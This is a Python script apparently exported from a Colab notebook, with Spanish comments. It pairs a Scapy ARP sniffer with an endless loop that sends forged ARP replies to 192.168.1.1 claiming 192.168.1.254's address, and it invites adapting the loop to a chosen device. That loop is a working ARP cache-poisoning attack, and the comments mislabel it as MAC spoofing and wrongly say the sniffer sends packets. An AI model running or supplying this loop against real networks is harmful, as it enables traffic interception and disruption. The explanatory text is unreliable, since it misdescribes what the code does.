# -*- coding: utf-8 -*-
"""Filtrado y Suplantacion MAC.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1uLP5hOcbluSke2mQYzBr40XeB61ffplD

# **Filtrado MAC**
El siguiente código en Python utiliza la biblioteca Scapy para enviar paquetes ARP a una red y filtrar los paquetes que contienen una dirección MAC específica:
"""

from scapy.all import *

def arp_display(pkt):
    if pkt[ARP].op == 1: #who-has (request)
        if pkt[ARP].psrc == '0.0.0.0': # ARP Probe
            print("ARP Probe from: " + pkt[ARP].hwsrc)

sniff(prn=arp_display, filter="arp", store=0)

"""Este código escucha los paquetes ARP en una red y muestra la dirección MAC de los paquetes que contienen una dirección IP de origen de 0.0.0.0. Puedes modificar el código para filtrar los paquetes que contienen una dirección MAC específica.

# **Suplantación de MAC**
El siguiente código en Python utiliza la biblioteca Scapy para enviar paquetes ARP a una red y suplantar la dirección MAC de un dispositivo:
"""

from scapy.all import *

def spoof_mac(target_ip, spoof_ip, mac_address):
    packet = ARP(op=2, pdst=target_ip, hwdst=mac_address, psrc=spoof_ip)
    send(packet)

target_ip = "192.168.1.1"
spoof_ip = "192.168.1.254"
mac_address = "00:11:22:33:44:55"

while True:
    spoof_mac(target_ip, spoof_ip, mac_address)

"""Este código envía paquetes ARP a una red y suplanta la dirección MAC de un dispositivo. Puedes modificar el código para suplantar la dirección MAC de un dispositivo específico."""